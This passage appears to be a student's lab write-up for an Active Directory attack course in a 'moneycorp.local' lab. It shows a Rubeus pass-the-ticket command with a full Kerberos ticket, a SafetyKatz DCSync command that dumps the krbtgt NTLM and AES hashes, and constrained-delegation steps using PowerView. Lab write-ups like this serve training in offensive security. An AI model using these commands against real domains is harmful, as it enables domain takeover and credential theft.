C:\AD\Tools\Rubeus.exe ptt /ticket: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
```
And use safetykatz to dcsync and dump the hash
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
![[Pasted image 20231025170101.png]]
`krbtgt - moneycorp.local`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | null                                      |
| NTLM | a0981492d5dfab1ae0b97b51ea895ddf |
| aes256_hmac | 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e |




### **FLAG 26 - Value of msds-allowedtodelegate to attribute of dcorp-adminsrv**
- Enumerate users in the domain for who Constrained Delegation is enabled.
   - For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
   - Pass the ticket and access the service.
- Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
   - For such a user, request a TGT from the DC.
   - Obtain an alternate TGS for LDAP service on the target machine.
   - Use the TGS for executing DCSync attack

*Enumerate users in the domain for who Constrained Delegation is enabled.*
Import powerview and use it
```powerview
Get-DomainUser -TrustedToAuth
```
